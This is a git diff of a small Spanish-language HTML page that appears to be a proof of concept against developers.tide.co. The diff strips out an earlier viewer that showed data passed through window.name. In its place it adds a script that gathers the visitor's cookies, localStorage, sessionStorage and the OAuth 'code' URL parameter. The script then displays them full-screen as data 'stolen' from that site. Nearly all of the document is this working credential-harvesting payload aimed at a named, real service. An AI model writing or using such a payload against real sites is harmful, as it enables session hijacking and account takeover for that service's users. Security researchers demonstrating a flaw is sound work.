@@ -1,38 +1,18 @@
-<!DOCTYPE html>
 <html>
-  <head>
-    <title>Datos capturados</title>
-    <style>
-      body {
-        font-family: monospace;
-        padding: 30px;
-        background-color: #fff;
-      }
-      h1 {
-        color: #111;
-        margin-bottom: 20px;
-      }
-      pre {
-        padding: 20px;
-        background-color: #f5f5f5;
-        border-radius: 8px;
-        white-space: pre-wrap;
-        word-wrap: break-word;
-        border: 1px solid #ccc;
-      }
-    </style>
-  </head>
   <body>
-    <h1>Datos capturados desde developers.tide.co</h1>
-    <pre id="data">Cargando...</pre>
-
+    <p>Si esta página es abierta por developers.tide.co con el atributo vulnerable, se ejecutará:</p>
     <script>
-      try {
-        const datos = window.name;
-        document.getElementById("data").innerText = datos || "No se recibió nada en window.name";
-      } catch (e) {
-        document.getElementById("data").innerText = "Error: " + e.message;
-      }
+      const datos = JSON.stringify({
+        cookies: document.cookie,
+        localStorage: Object.fromEntries(Object.entries(localStorage)),
+        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+        code: new URLSearchParams(location.search).get("code")
+      }, null, 2);
+
+      const div = document.createElement("div");
+      div.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999;padding:20px;font-family:monospace";
+      div.innerText = "Datos robados desde developers.tide.co:\n\n" + datos;
+      document.body.appendChild(div);
     </script>
   </body>
 </html>
